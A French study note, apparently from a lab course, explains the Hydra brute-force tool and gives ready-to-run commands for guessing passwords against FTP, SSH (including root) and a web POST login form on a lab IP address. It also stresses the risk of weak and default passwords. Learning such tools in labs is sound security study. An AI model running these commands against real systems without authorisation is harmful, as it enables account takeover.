Hydra est un outil de **[[Brute Force]] en ligne** permettant de tester rapidement des listes de mots de passe contre divers services d’authentification (ex. SSH, FTP, HTTP, SMTP, MySQL, RDP, Telnet, VNC, etc.).

- **Fonctionnement :**
    
    - Automatisation de tentatives de connexion (ex. via dictionnaire de mots de passe).
        
    - Permet de trouver des identifiants faibles ou par défaut.
        
- **Risques :**
    
    - Les mots de passe **courants**, **simples** (<8 caractères, sans complexité), ou **par défaut** (ex. `admin:password`) sont facilement cassés.
        
- **Bonne pratique :**  
    → Toujours remplacer les mots de passe par défaut et utiliser des mots de passe robustes pour éviter une compromission rapide.



## 1️⃣ FTP

Commandes :  
hydra -l user -P passlist.txt ftp://10.10.224.225

- `-l user` : username
    
- `-P passlist.txt` : liste de mots de passe
    

---

## 2️⃣ SSH

Commandes :  
hydra -l <username> -P <full path to pass> 10.10.224.225 -t 4 ssh

- `-l <username>` : username
    
- `-P <wordlist>` : fichier de mots de passe
    
- `-t 4` : nombre de threads parallèles (ici 4)
    

Exemple concret :  
hydra -l root -P passwords.txt 10.10.224.225 -t 4 ssh

---

## 3️⃣ Web Form (POST)

Commandes :  
hydra -l <username> -P <wordlist> 10.10.224.225 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

- `http-post-form` : type de formulaire POST
    
- `/` : chemin du formulaire (login page)
    
- `username=^USER^&password=^PASS^` : champs du formulaire
    
- `F=incorrect` : texte affiché en cas d’échec
    
- `-V` : verbose, affiche toutes les tentatives
    

> Pour déterminer si la page utilise GET ou POST, consulter l’onglet **Network** dans les dev tools du navigateur.